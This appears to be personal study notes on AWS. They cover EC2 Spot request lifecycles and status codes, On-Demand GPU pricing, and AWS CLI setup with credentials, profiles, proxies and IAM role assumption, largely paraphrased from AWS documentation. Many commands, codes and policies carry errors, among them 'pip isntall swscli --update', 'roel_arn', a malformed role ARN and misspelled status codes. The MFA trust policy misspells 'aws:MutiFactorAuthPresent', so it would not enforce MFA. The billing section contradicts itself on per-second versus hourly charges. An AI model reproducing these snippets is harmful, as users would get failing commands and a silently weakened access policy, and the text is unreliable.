  * **Request**: The simple request type, which submits a one-time Spot instance request.
  * **Request and Maintain**: Request a fleet of Spot instances to maintain your target capacity. If you want to maintain a certain number of instances you can choose this one.
  * **Reserve for duration**: Request a Spot instance with no interruption for 1 to 6 hours (a spot block). 
* About Maximum price:
Here you can bid your price or maybe you can use the automated bidding so it will automatically place the bidding on behalf of you (Provision Spot instances at the current Spot price capped at the On-Demand price) which is as lowest at possible.
* User data!!!how to write and run a script!!!
    If you want to specify user data such as certain scripts or certain commands that should be executed on the launch of instance you can specify here.
* Keypair
    You can create a new keypair or use a created keypair.
    Create a new keypair and save to local drive, and connect to the instance using the follow command via SSH:
    `ssh -i path/to/pem/file ec2-user@14.169.42.132`
    The ip address can be checked from "Instances" on the AWS control pane.

###### Spot Request Status
To help you track your Spot Instance requests and plan your use of Spot Instances, use the request status provided by Amazon EC2. For example, the request status can provide the reason why your Spot request isn't fulfilled yet, or list the constraints that are preventing the fulfillment of your Spot request.
At each step of the process-also called the Spot request *lifecycle*, specific events determine successive request states.
* Life Cycle of a Spot Request
    The following diagram shows you the paths that your Spot request can follow throughout its lifecycle, from submission to termination. Each step is depicted as a node, and the status code for each node describes the status of the Spot request and Spot Instance.
    ![lifecycle of a Spot Request](spot-bid-status-diagram.png)
    * Pending evaluation
        As soon as you make a Spot Instance request, it goes into the `pending-evaluation` state unless one or more request parameters is not valid `bad-parameters`).

Status Code|Request State|Instance State
--|--|--
pending-evaluation|open|n/a
bad-parameters|closed|n/a
    * Holding
        If one or more request constrains are valid but can't be met yet, or if there is not enough capacity, the request goes into a holding state waiting for the constraints to be met. The request options affect the likelihood of the request being fulfilled. For example, if you specify a maximum price below the current Spot price, your request stays in a holding state until the Spot price goes below your maximum price. If you specify an Availability Zone group, the request stays in a holding state until the Availability Zone constraint is met.

Status Code|Request State|Instance State
--|--|--
capacity-not-available|open|n/a
capacity-oversubscribed|open|n/a
price-too-low|open|n/a
not-scheduled-yet|open|n/a
launch-group-constraint|open|n/a
az-group-constraint|open|n/a
placement-group-constraint|open|n/a
constraint-not-fulfillable|open|n/a
    * Pending evaluation/fulfillment-terminal
        Your Spot Instance request can go to a terminal state if you create a request that is valid only during a specific time period and this time period expires before your request reaches the pending fulfillment phase, you cancel the request, or a system error occurs.

Status Code|Request State|Instance State
--|--|--
schedule-expired|cancelled|n/a
cancelled-before-fulfillment*|cancelled|n/a
bad-parameters|failed|n/a
system-error|closed|n/a
`*`: If you cancel the request.
    * Pending fulfillment
        When the constraints you specified (if any) are met and your maximum price is equal to or higher than the current Spot price, your Spot request goes into the pending-fulfillment state.
        At this point, Amazon EC2 is getting ready to provision the instances that you requested. If the process stops at this point, it is likely to be because it was cancelled by the user before a Spot Instance was launched, or because an unexpected system error occurred.

Status Code|Request State|Instance State
--|--|--
pending-fulfillment|open|n/a
    * Fulfilled
        When all the specifications for your Spot Instances are met, your Spot request is fulfilled. Amazon EC2 launches the Spot Instances, which can take a few minutes. If a Spot Instance is hibernated or stopped when interrupted, it remains in this state until the request can be fulfilled again or the request is cancelled.

Status Code|Request State|Instance State
--|--|--
fulfilled|active|pending→ running
fulfilled|active|stopped→ running
    * Fulfilled-terminal
        Your Spot Instances continue to run as long as your maximum price is at or above the Spot price, there is available capacity for your instance type, and you don't terminate the instance. If a change in the Spot price or available capacity requires Amazon EC2 to terminate your Spot Instances, the Spot request goes into a terminal state. For example, if your price equals the Spot price but Spot Instances are not available, the status code is `instance-terminated-capacity-oversubscribed`. A request also goes into the terminal state if you cancel the Spot request or terminate the Spot Instances.

Status Code|Request State|Instance State
--|--|--
request-cancelled-and-instance-running|cancelled|running
marked-for-stop|active|running
marked-for-termination|closed|running
instance-stopped-by-price|disabled|stopped
instance-stopped-by-user|disabled|stopped
instance-stopped-capacity-oversubscribed|disabled|stopped
instance-stopped-no-capacity|disabled|stopped
instance-terminated-by-price|closed(one-time), open(persistent)|terminated
instance-terminated-by-schedule|closed|terminated
instance-terminated-by-service|cancelled|terminated
instance-terminated-by-user †|closed or cancelled*|terminated
instance-terminated-no-capacity|closed(one-time), open(persistent)|terminated
instance-terminated-capacity-oversubscribed|closed(one-time), open(persistent)|terminated
instance-terminated-launch-group-constraint|closed(one-time), open(persistent)|terminated
`†`: A Spot Instance can only get to this state if a user runs the shutdown command from the instance. We do not recommend that you do this, as the Spot service might restart the instance.
`*`: The request state is closed if you terminate the instance but do not cancel the request. The request state is cancelled if you terminate the instance and cancel the request. Note that even if you terminate a Spot Instance before you cancel its request, there might be a delay before Amazon EC2 detects that your Spot Instance was terminated. In this case, the request state can either be closed or cancelled.
    * Persistent requests
        When your Spot Instances are terminated (either by you or Amazon EC2), if the Spot request is a persistent request, it returns to the pending-evaluation state, and then Amazon EC2 can launch a new Spot Instance when the constraints are met.
* Getting Request Status Information
    You can get request status information using the AWS Management Console or a command line tool.
    * To get request status information using the console
        1. Open the Amazon EC2 console at https://console/aws.amazon.com/ec2/ .
        2. In the navigation pane, choose **Spot Requests**, and then select the Spot Request.
        3. Check the value of Status in the Description tab.
* Spot Request Status Codes
    Spot request status information is composed of a status code, the update time, and a status message. Together, these help you determine the disposition of your Spot request.
    The following are the Spot request status codes:
    * `az-group-constraint`: Amazon EC2 cannot launch all the instances you requested in the same Availability Zone.
    * `bad-parameters`: One or more parameters for your Spot request are not valid (for example, the AmI you specified does not exist). The status message indicates which parameter is not valid.
    * `cancelled-before-fulfillment`: The user cancelled the Spot request before it was fulfilled.
    * `capacity-not-available`: There is not enough capacity available for the instances that you request.
    * `capacity-oversubscribed`: There is not enough capacity available for the instances that you requested.
    * `constraint-not-fulfillable`: The Spot request can't be fulfilled because one or more constraints are not valid (for example, the Availability Zone does not exist). The status message indicates which constraint is not valid.
    * `fulfilled`: The Spot request is active, and Amazon EC2 is launching your Spot Instances.
    * `instance-stopped-by-price`: Your instance was stopped because the Spot price exceeded your maximum price.
    * `instance-stopped-by-user`: Your instance was stopped because a user ran `shutdown -h` from the instance.
    * `instance-stopped-capacity-oversubscribed`: Your instance was stopped because the number of Spot requests with maximum prices equal to or higher than the Spot price exceeded the available capacity in this Spot Instance pool. (Note that the Spot price might not have changed.)
    * `instance-stopped-no-capacity`: Your instance was stopped because there was no longer enough Spot capacity available for the instance.
    * `instance-terminated-by-price`: Your instance was terminated because the Spot price exceeded your maximum price. If your request is persistent, the process restarts, so your request is pending evaluation.
    * `instance-termianted-by-schedule`: Your Spot Instance was terminated at the end of its scheduled duration.
    * `instance-terminated-by-service`: Your instance was terminated from a stopped state.
    * `instance-terminated-by-user` or `spot-instance-terminated-by-user`: You terminated a Spot Instance that had been fulfilled, so the request state is closed (unless it's persistent request) and the instance state is terminated.
    * `inxtance-terminated-capacity-oversubscribed`: Your instance was terminated because the number of Spot requests with maximum prices equal to or higher than the Spot price exceeded the available capacity in this Spot Instance pool. (Note that the Spot price might not have changed.)
    * `instance-terminated-launch-group-constraint`: One or more of the instances in your launch group was terminated, so the launch group constraint is no longer fulfilled.
    * `instance-terminated-no-capacity`: Your instance was terminated because there is no longer enough Spot capacity available for the instance.
    * `launch-group-constraint`: Amazon EC2 cannot launch all the instances that you requested at the same time. All instances in a launch group are started and terminated together.
    * `limit-exceeded`: The limit on the number of EBS volumes or total volume storage was exceeded.
    * `markded-for-stop`: The Spot Instance is marked for stopping.
    * `marked-for-termination`: The Spot Instance is marked for termination.
    * `not-scheduled-yet`: The Spot request will not be evaluated until the scheduled date.
    * `pending-evaluation`: After yo make a Spot Instance request, it goes into the pending-evaluation state while the system evaluates the parameters of your request.
    * `pending-fulfillemnt`: Amazon EC2 is trying to provision your Spot Instances.
    * `placement-group-constraint`: The Spot request can't be fulfilled yet because a Spot Instance can't be added to the placement group at this time.
    * `price-too-low`: The request can't be fulfilled yet because your maximum price is below the Spot price. In this case, no instance is launched and your request remains open.
    * `request-cancelled-and-instance-running`: You cancelled the Spot request while the Spot Instances are still running. The request is cancelled, but the instances remain running.
    * `schedule-expired`: The Spot request expired because it was not fulfilled before the specified date.
    * `system-error`: There was an unexpected system error. If this is a recurring issue, please contact customer support for assistance.
##### [Amazon EC2 On-Demand Instances Pricing](https://amazonaws-china.com/ec2/pricing/on-demand/)
On-Demand isntances let you pay for compute capacity by the hour or second (minimum of 60 seconds) with no long-term commitments. This frees you from the costs and complexities of planning, purchasing, and maintaining hardware and transforms what are commonly large fixed costs into much smaller variable costs.

GPU Instances - Current Generation|vCPU|ECU|Memory(GiB)|Instance Storage(GB)|Linux/UNIX Usage
--|--|--|--|--|--
p3.2xlarge|8|26|61GB|EBS Only|$3.06 per Hour
p3.8xlarge|32|94|244GiB|EBS Only|$12.24 per Hour
p3.16xlarge|64|188|488 GiB|EBS Only|$24.48 per Hour
p2.xlarge|4|12|61 GiB|EBS Only|$0.90 per Hour
p2.8xlarge|32|94|488 GiB|EBS Only|$7.20 per Hour
p2.16xlarge|64|188|768 GiB|EBS Only|$14.40 per Hour
g3.4xlarge|16|47|122 GiB|EBS Only|$1.14 per Hour
g3.8xlarge|32|94|244 GiB|EBS Only|$2.28 per Hour
g3.16xlarge|64|188|488 GiB|EBS Only|$4.56 per Hour

They charge you by the fractional rounding up so if you run it for one minute you're going to pay for an hour; if you run it for an hour in one minute you're going to pay for two hours.

###### how to start a On-Demand Instance

#### AWS User data and custom scripts!!!

#### ASW command line!!!
The AWS Command Line Interface (CLI) is a unified tool to mange your AWS services. With just one tool to download and configure, you can control multiple AWS services from the command line and automate them through scripts.
The AWS CLI introduces a new set of simple file commands for efficient file transfers to and from Amazon S3.
##### aws-shell (Developer Preview)
aws-shell is a command-lien shell program that provides convenience and productivity features to help both new and advanced users of the AWS Command Line Interface. Key features include the following.
* Fuzzy auto-completion for
    * Commands (e.g. ec2, describe-instances, sqs, create-queue)
    * Options (e.g. `--instance-ids`, `--queue-url`)
    * Resource identifiers (e.g. Amazon EC2 instance IDs, Amazon SQS queue URLs, Amazon SNS topic names)
* Dynamic in-line documentation
    * Documentation for commands and options are displayed as you type
* Execution of OS shell commands
    * Use common OS commands such as cat, ls, and cp and pipe inputs and outputs without leaving the shell
    * Execute regular shell commands by piping or prefixing shell commands with `!`.
* Export executed commands to a text editor
    Running the `.edit` command after executing some commands gives you all the commands in your default text editor.
##### Installing
The AWS Command Line Interface User Guide walks you through installing and configuring the tool. After that, you can begin making calls to your AWS services from the command line.
###### What is the AWS Command Line Interface?
The AWS CLI is an open source tool built on top of the AWS SDK for Python (Boto) that provides commands for interacting with AWS services. With minimal configuration, you can start using all of the functionality provided by the AWS Management Console from your favorite terminal program.
* Linux shells-Use common shell programs such as Bash, Zsh, and tsch to run commands in Linux, macOS, or Unix.
* Windows command line-On Microsoft Windows, run commands in either PowerShell or the Windows Command Processor.
* Remotely-Run commands on Amazon EC2 instances through a remote terminal such as PuTTY or SSH, or with Amazon EC2 systems manager.
The AWS CLI provides direct access to AWS services' public APIs. Explore a service's capabilities with the AWS CLI, and develop shell scripts to manage your resources. Or take what you've learned to develop programs in other languages with the AWS SDK.
In addition to the low level, API equivalent commands, the AWS CLI also provides customizations for several services. Customizations are higher level commands that simplify using a service with a complex API. For example, the `aws s3` set of commands provide a familiar syntax for managing files in Amazon S3.
**Example Upload a file to Amazon S3**
`aws s3 cp` provides a shell-like copy command, and automatically performs a multipart upload to transfer large files quickly and resiliently.
`~$ aws s3 cp myvideo.mp4 s3://mybucket/`
Performing the same task with the low level commands (available under `aws s3api`) would take a lot more effort.
Depending on your use case, you may want to use the AWS SDK, a toolkit, or the AWS Tools for Windows PowerShell.
* AWS Tools for Windows PowerShell
* AWS SDK for Java
* AWS SDK for .NET
* AWS SDK for JavaScript
* AWS SDK for Ruby
* AWS SDK for Python (Boto)
* AWS SDK for PHP
* AWS SDK for Go
* AWS Toolkit for Eclipse
* AWS Toolkit for Visual Studio
* AWS Mobile SDK for iOS
* AWS Mobile SDK for Android
You can also view-and fork-the source code for the AWS CLI on GitHub in the aws-cli repository.
####### Using the Examples in this Guide
The examples in this guide are formatted with the following conventions:
* Prompt-The command prompt is displayed as a dollar sign (`$`). Do not include the prompt when you type commands.
* Directory-When commands must be executed from a specific directory, the directory name is shown before the prompt symbol.
* User Input-Command text that you should enter at the command lien is formatted as **user input**.
* Replacable Text-Variable text, including names of resources that you choose, or IDs generated by AWS services that you must include in commands, is formatted as *replacable text* (in red color). In multiple line commands or commands where specific keyboard input is required, keyboard commands can also be shown as replacable text.
* Output-Output returned by AWS services is shown beneath user input without any special formatting.
For example, the following command includes user input, replacable text, and output:
![example of aws cli](aws_cli_examples.jpg)
To use this example, type `aws configure` at the command line and press **Enter**. `aws configure` is the command. This command is interactive, so the AWS CLI outputs liens of texts, prompting you to enter additional information. Enter each of your access keys in turn and press **Enter**. Then, enter a region name in the format shown, press **Enter**, and press **Enter** a final time to skip the output format setting. The final **Enter** command is shown as replacable text because there is no user input for that line. Otherwise, it would be implied.
The following example shows a simple non-interactive command with output from the service in JSON format:

        $ aws ec2 create-security-group --group-name my-sg --description "My security group"
        {
          "GroupId":"sg-903004f8"
        }
To use this example, enter the full text of the command and press Enter. The name of the security group, `my-sg` is replacable. In this case, you can use the group name as shown, but you will probably want to use a more descriptive name.
The JSON document, including the curly braces, is output. If you configure your CLI to output in test or table format, the output will be formatted differently. JSON is the default output format.
###### Installing the AWS Command Line Interface
The primary distribution method for the AWS CLI on Linux, Windows, and macOS is pip, a package manager for Python that provides an easy way to install, upgrade, and remove Python packages and their dependencies.
* Requirements
    * Python 2 version 2.6.5+ or Python 3 version 3.3+
    * Windows, Linux, macOS, or Unix
If you already have pip and a supported version of Python, you can install the AWS CLI with the following command:
`$ pip install awscli --upgrade --user`
The `--upgrade` option tells pip to upgrade any requirements that are already installed. The `--user` option tells pip to install the program to a subdirectory of your user directory to avoid modifying libraries used by your operating system.
If you encounter issues when you attempt to install the AWS CLI with pip, you can [install the AWS ClI in a virtual environment](https://docs.aws.amazon.com/cli/latest/userguide/awscli-install-virtualenv.html) to isolate the tool and its dependencies, or use a different version of Python than you normally do.
####### Standalone Installers
For offline or automated installations on Linux, macOS, or Unix, try the [bundled installer](https://docs.aws.amazon.com/cli/latest/userguide/awscli-install-bundle.html). The bundled installer includes the AWS CLI, its dependencies, and a shell script that performs the installation for you.
On windows, you can also use the [MSI installer](https://docs.aws.amazon.com/cli/latest/userguide/awscli-install-windows.html#install-msi-on-windows). Both of these methods simplify the initial installation, with the tradeoff of being more difficult to upgrade when a new version of the AWS CLI is released.
After you install the AWS CLI, you may need to add the path to the executable file to your PATH variable. For platform specific instructions, see the following topics:
* Linux-[Adding the AWS CLI Executable to your Command Line Path](https://docs.aws.amazon.com/cli/latest/userguide/awscli-install-linux.html#awscli-install-linux-path)
* Windows-[Adding the AWS CLI Executable to your Command Line Path](https://docs.aws.amazon.com/cli/latest/userguide/awscli-install-windows.html#awscli-install-windows-path)
* macOS-[Adding the AWS CLI Executable to your Command Line Path](https://docs.aws.amazon.com/cli/latest/userguide/awscli-install-windows.html#awscli-install-windows-path)
Verify that the AWS CLI installed correctly by running `aws --version`.
`$ aws --version`
`aws-cli/1.11.84 Python/3.6.2 Linux/4.4.0-59-generic botocore/1.5.47`
The AWS CLI is updated regularly to add support for new services and commands. To update to the latest version of the AWS CLI, run the installation command again.
`$ pip isntall swscli --update --user`
If you need to uninstall the AWS CLI, use pip uninstall.
`pip uninstall awscli`
##### Configuring the AWS CLI
This section explains how to configure settings that the AWS Command Line Interface uses when interacting with AWS, such as your security credentials and the default region.
**Note**: The AWS CLI signs requests on your behalf, and includes a date in the signature. Ensure that your computer's date and time are set correctly; if not, the date in the signature may not match the date of the request, and AWS rejects the request.
###### Quick Configuration
For general use, the `aws configure` command is the fastest way to set up your AWS CLI installation.

        $ aws configure
        AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
        AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
        Default region name [None]: us-west-2
        Default output format [None]:json
The AWS CLI will prompt you for four pieces of information. AWS Access Key ID and AWS Secret Access Key are your account credentials.
**To get the access key ID and secret access key for an IAM user**
Access keys consist of an access key ID and secret access key, which are used to sign programmatic requests that you make to AWS. If you don't have access keys, you can create them from the AWS Management Console. We recommend that you use IAM access keys instead of AWS account root user access keys. IAM lets you securely control access to AWS services and resources in your AWS account.
The only time that you can view or download the secret access keys is when you create the keys. You cannot recover them later. However, you can create new access keys at any time. You must also have permissions to perform the required IAM actions. For more information, see Permissions Required to Access IAM Resources in the IAM User Guide.
1. Open the IAM console.
2. In the navigation pane of the condole, choose **Users**.
3. Choose your IAM user name (not the check box).
4. Choose the Security credentials tab and then choose **Create access key**.
5. To see the new access key, choose **Show**. Your credentials will look something like this:
  * Access key ID: AKIAIOSFODNN7EXAMPLE
  * Secret access key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
6. To download the key pair, choose **Download .csv file**. Store the keys in a secure location.
Keep the keys confidential in order to protect your AWS account, and never email them. Do not share them outside your organization, even if an inquiry appears to come from AWS or Amazon.com. No one who legitimately represents Amazon will ever ask you for your secret key.
Default region is the name of the region you want to make calls against by default. This is usually the region closest to you, but it can be any region. For example, type `us-west-2` to use US West (Oregon).
**Note**: You must specify an AWS region when using the AWS CLI. For a list of services and available regions, see Regions and Endpoints. The region designators used by the AWS CLI are the same names that you see AWS Management Console URLs and service endpoints.
Default output format can be either json, text, or table. If you don't specify an output format, json is used.
If you have multiple profiles, you can configure additional, named profiles by using the `--profile` option.

        $ aws configure --profile user2
        AWS Access Key ID [None]: AKIAI44QH8DHBEXAMPLE
        AWS Secret Access Key [None]: je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY
        Default regioon name [None]: us-east-1
        Default output format [None]: text
To update any of your settings, simply run `aws configur` again and enter new values as appropriate. The next sections contain more information on the files that `aws configure` creates, additional settings, and named profiles.
###### Configuration and Credential Files
####### Configuration Settings and Precedence
The AWS CLI uses a *provider chain* to look for AWS credentials in a number of different places, including system or user environment variables and local AWS configuration files.
The AWS CLI looks for credentials and configuration settings in the following order:
1. Command line options-region, output format and profile can be specified as command options to override default settings.
2. Environment variables-AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN.
3. The AWS credential file-located at `~/.aws/credentials` on Linux, macOS, or Unix, or at `C:\Users\Username\.aws\credentials` on Windows. This file can contain multiple named profiles in addition to a default profile.
4. The CLI configuration file-typically located at `~/.aws/config` on Linux, macOS, or Unix, or at `C:\Users\USERNAME\.aws\config` on Windows. This file can contain a default profile, named profiles, and CLI specific configuration parameters for each.
5. Container credentials-provided by Amazon Elastic Container Service on container instances when you assign a role to your task.
6. Instance profile credentials-these credentials can be used on EC2 instances with an assigned instance role, and are delivered through the Amazon EC2 metadata service.
####### Configuration and Credential Files
The CLI stores credentials specified with `aws configure` in a local file named `credentials` in a folder named `.aws` in your home directory. Home directory location varies but can be referred to using the environment variables `%UserProfile%` in Windows and `$HOME` or `~`(tilde) in Unix-like systems.
For example, the following commands list the contents of the `.aws` folder:
* Linux, macOS, or Unix
    `$ ls ~/.aws`
* Windows
    `> dir "%UserProfile%\.aws"`
In order to separate credentials from less sensitive options, region and output format are stored in a separate file named `config` in the same folder.
The default file location for the config file can be overridden by setting the AWS_CONFIG_FILE environment variable to another local path.
**Storing Credentials in Config**
The AWS CLI will also read credentials from the config file. If you want to keep all of your profile settings in a single file, you can. If there are ever credentials in both locations for a profile (say you used `aws configure` to update the profile's keys), the keys in the credentials file will take precedence.
If you use one of the SDKs in addition to the AWS CLI, you may notice additional warnings if credentials are not stored in their own file.
The files generated by the CLI for the profile configured in the previous section look like this:

        cat ~/.aws/credentials
        [default]
        aws_access_key_id=AKIAIOSFODNN7EXAMPLE
        aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

        cat ~/.aws/config
        [default]
        region=us-west-2
        output=json
The following settings are supported.
**aws_access_key_id**-AWS access key.
**aws_secret_access_key**-AWS secret key.
**aws_session_token**-AWS session token. A session token is only required if you are using temporary security credentials.
**region**-AWS region.
**output**-output format (json, text, or table).
###### Named Profiles
The AWS CLI supports *named profiles* stored in the config and credentials files. You can configure additional profiles by using `aws config` with the `--profile` option or by adding entries to the config and credentials files.
The following example shows a credentials files with two profiles:

        cat ~/.aws/credentials
        [default]
        aws_access_key_id=AKIAIOSFODNN7EXAMPLE
        aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

        [user2]
        aws_access_key_id=AKIAI44QH8DHBEXAMPLE
        aws_secret_access_key=je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY
Each profile uses different credentials-perhaps from two different IAM users-and can also use different regions and output formats.

        cat ~/.aws/config
        [default]
        region=us-west-2
        output=json

        [profile user2]
        region=us-east-1
        output=text
**Important**: The AWS credentials file uses a different naming format than the CLI config file for named profiles. Do not include the 'profile' prefix when configuring a named profile in the AWS credentials file.
####### Using Profiles with the AWS CLI
To use a named profile, add the `--profile` option to your command. The following example lists running instances using the user2 profile from the previous section.
`$ aws ec2 describe-instances --profile user2`
If you are going to use a named profile for multiple commands, you can avoid specifying the profile in every command by setting the AWS_PROFILE environment variable at the command line.
* Linux, macOS, or Unix
    `$ export AWS_PROFILE=user2`
* Windows
    `>set AWS_PROFILE=user2`
Setting the environment variable changes the default profile until the end of your shell session, or until you set the variable to a different value. More on variables in the next section.
###### Environment Variables
Environment variables override configuration and credential files and can be useful for scripting or temporarily setting a named profile as the default.
The AWS CLI supports the following environment variables.
* AWS_ACCESS_KEY_ID-AWS access key.
* AWS_SECRET_ACCESS_KEY-AWS secret key. Access and secret key variables override credentials stored in credential and config files.
* AWS_SESSION_TOKEN-Specify a session token if you are using temporary security credentials.
* AWS_DEFAULT_REGION-AWS region. This variable overrides the default region of the in-use profile, if set.
* AWS_DEFAULT_OUTPUT-Change the AWS CLI's output formatting to json, text, or table.
* AWS_PROFILE-name of the CLI profile to use. This can be the name of a profile stored in a credential or config file, or default to use the default profile.
* AWS_CA_BUNDLE-Specify the path to a certificate bundle to use for HTTPS certificate validation.
* AWS_SHARED_CREDENTIALS_FILE-Change the location of the file that the AWS CLI uses to store access keys.
* AWS_CONFIG_FILE-Change the location of the file that the AWS CLI uses to store configuration profiles.
The following example shows how you would configure environment variables for the default user from earlier in this guide.
* Linux, macOS, or Unix
    `$ export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE`
    `$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`
    `$ export AWS_DEFAULT_REGION=us-west-2`
* Windows
    `> set AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE`
    `> set AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`
    `> set AWS_DEFAULT_REGION=us-west-2`
###### Command Line Options
You can use the following command line options to override the default configuration settings for a single command. You cannot use command lien options to specify credentials.
* `--profile`: The name of a named profile to use.
* `--region`: The AWS Region to call.
* `--outptu`: The output format.
* `--endpoint-url`: The URL to make the call against. For most commands, the AWS CLI automatically determines the URL based on the service and AWS Region. However, some commands require that you specify an account-specific URL.
When you provide one of these options at the command line, it overrides the default configuration and corresponding profile setting for a single command. Each option takes a string argument with a space or equals sign (=) separating the argument from the option name. When the argument string contains a space, use quotation marks around the argument.
**Tip**: To set up additional profiles, you can use the `--profile` options with `aws config`.
`$ aws configure --profile <profilename>`
Common uses for command line options include checking your resources in multiple AWS Regions, and changing the output format for legibility or ease of use when scripting. For example, if you're not sure which region your instance is running, you can run the `describe-instances` command against each region until you find it, as follows.

        $ aws ec2 describe-instances --output table --region us-east-1
        ---------------
        |DescribeInstances|
        +-------------+
        $ aws ec2 describe-instances --output table --region us-west-1
        ---------------
        |DescribeInstances|
        +-------------+
        $ aws ec2 describe-instances --output table --region us-west-2
        --------------------------------------
        |           DescribeInstances       |
        +----------------------------------+
        ||          Reservations        ||
        |+--------------------------------+|
        || OwnerId      |01234567890        ||
        || ReservationI  | r-abcdefgh       ||
        |+------------+--------------------+|
        |||         Instances           |||
        ||+-------------+------------------+||
        ||| AmiLaunchIndex      |0          |||
        ||| Architecture | x86_64           |||
###### Instance Metadata
To use the CLI from an EC2 instance, create a role that has access to the resources needed and assign that role to the instance when it is launched. Launch the instance and check to see if the AWS CLI is already installed (it comes pre-installed on Amazon Linux).
Install the AWS CLI if necessary and config a default region to avoid having to specify it in every command. You can set the region using `aws configure` without entering credentials by pressing enter twice to skip the first two prompts:

        $ aws configure
        AWS Access Key ID [None]:ENTER
        AWS Secret Access Key [None]:ENTER
        Default region name [None]: us-west-2
        Default output format [None]: json
The AWS CLI will read credentials from the instance metadata.
###### Using an HTTP Proxy
If you need to access AWS through proxy servers, you should configure the HTTP_PROXY and HTTPS_PROXY environment variables with the IP addresses for your proxy servers.
* Linux, macOS, or Unix
    `$ export HTTP_PROXY=http://a.b.c.d:n`
    `$ export HTTPS_PROXY=http://w.x.y.z:m`
* Windows
    `> set HTTP_PROXY=http://a.b.c.d:n`
    `> set HTTPS_PROXY=http://w.x.y.z:m`
In these examples, `http://a.b.c.d:n` and `http://w.x.y.z:m` are the IP addresses and ports for the HTTP and HTTPS proxies.
####### Autenticating a Proxy
* Linux, macOS, or Unix
    `$ export HTTP_PROXY=http://username:password@a.b.c.d:n`
    `$ export HTTPS_PROXY=http://username:password@w.x.y.z:m`
* Windows
    `> set HTTP_PROXY=http://username:password@a.b.c.d:n`
    `> set HTTPS_PROXY=http://username:password@w.x.y.z:m`
**Note**: The AWS CLI does not support NTLM proxies. If you use an NTLM or Kerberos proxy, you may be able to connect through an authentication proxy like Cntlm.
####### Using a proxy on EC2 Instances
If you configure a proxy on an ec2 instance launched with an IAM role, you should also set the NO_PROXY environment variable with the IP address 169.254.169.254, so that the AWS CLI can access Instance Metadata.
* Linux, macOS, or Unix
    `$ export NO_PROXY=169.254.169.254`
* Windows
    `> set NO_PROXY=169.254.169.254`
###### Assuming a Role
An IAM role is a authorization tool that lets a user gain additional permissions, or get permission to peform actions in a different account.
You can configure the AWS Command Line Interface to use a role by creating a profile for the role in the `~/.aws/config` file. The following example shows a role profile named *marketingadmin* that is assumed by the default profile.

        [profile marketadmin]
        role_arn=arn:aws:iam::123456789012:role/marketingadmin
        source_profile=default
In this case, the default profile is an IAM user with credentials and permission to assume a role named marketingadmin. To access the role, you created a named profile. Instead of configuring this profile with credentials, you specify the ARN of the role and the name of the profile that has access to it.
####### Configuring and Using a Role
When you run commands using the role profile, the AWS CLI uses the source profile's credentials to call AWS Security Token Service and assume the specified role. The source profile must have permission to call `sts:assume-role` against the role, and the role must have a trust relationship with the source profile to allow itself to be assumed.
Create a new role in IAM with the permissions that you want users to assume by following the procedure under Creating a Role to Delegate Permissions to an IAM User in the AWS Identity and Access Management User Guide. If the role and the target IAM user are in the same account, you can enter your own account ID when configuring the role's trust relationship.
After creating the role, modify the trust relationship to allow the IAM user to assume it. The following example shows a trust relationship that allows a trust relationship that allows a role to be assumed by an IAM user named *jonsmith*:

        {
        "Version":"2012-10-17",
        "Statement":[
         {
          "Sid":"",
          "Effect":"Allow",
          "Principal":{
           "AWS":"arn:aws:iam::123456789012:user/jonsmith"
         },
         "Action":"sts:AssumeRole"
         }
         ]
         }
Next, grant your IAM user permission to assume the role. The following example shows an AWS Identity and Access Management policy that allows an IAM user to assume the marketingadmin role:

        {
         "Version":"2012-10-17",
         "Statement":[
          {
           "Effect":"Allow",
           "Action":"sts:AssumeRole",
           "Resource":"arn:aws:iam::123456789012:role/marketingadmin"
           }
          ]
          } 
The user doesn't need to have any additional permissions to run commands using the rule profile. If you want your users to be able to access AWS resources without using the role, apply additional inline or managed policies for those resources.
With the role profile, role permissions, trust relationship and user permissions applied, you can assume the role at the command line by using the `profile` option. For example:
`$ aws s3 ls --profile marketingadmin`
To use the role for multiple calls, you can set the AWS_PROFILE environment variable for the current session from the command line:
* Linux. macOS, or Unix
    `$ export AWS_PROFILE=marketingadmin`
* Windows
    `> set AWS_PROFILE=marketingadmin`
For more information on configuring IAM users and roles, see Users and Groups and Roles in the *AWS Identity and Access Management User Guide*.
####### Using Multifactor Authentication
For additional security, you can require users to provide a one time key generated from a authentication device or mobile app when they attempt to make a call using the role profile.
First, modify the trust relationship on the role to require multifactor authentication:

        {
         "Version":"2012-10-17",
         "Statement":[
          { 
           "Sid":"",
           "Effect":"Allow",
           "principal":{"AWS":"arn:aws:iam::123456789012:user/jonsmith"},
           "Action":"sts:AssumeRole",
           "Condition": { "Bool":{ "aws:MutiFactorAuthPresent":true}}
           }
          ]
          } 
Next, add a line to the role profile that specifies the ARN of the user's MFA device:

        [profile marketingadmin]
        roel_arn=arn:aws:iam::123456789012:role/marketingadmin
        source_profile=default
        mfa_serial=arn:aws:iam::123456789012:mfa/jonsmith
The mfa_serial setting can take an ARN, as show, or the serial number of a hardware MFA token.

####### Cross Account Roles
You can enable IAM users to assume roels that belong to different accounts by configuring the role as a cross account role. During role creating, set the role type to oen of the options under Role for Cross-Account Access and optionally select **Require MFA**. The **Require MFA** option configures the appropriate condition in the trust relationship as described in Using Multifactor Authentication.
If you use an external ID to provide addtional control over who can assume a role across accounts, add an external_id parameter to the role profile:

        [profile crossaccountrole]
        role_arn=:aws:iam::234567890123:role/xaccount
        source_profile=default
        mfa_serial=arn:aws:iam::123456789012:mfa/jonsmith
        external_id=123456
####### Clearing Cached Credentials
When you assume a role, the AWS CLI caches the temporary credentials locally until they expire. If your role's temporary credentials are revoked, you can delete the cache to force the AWS CLI to retrieve new credentials.
* Linux, macOS, or Unix
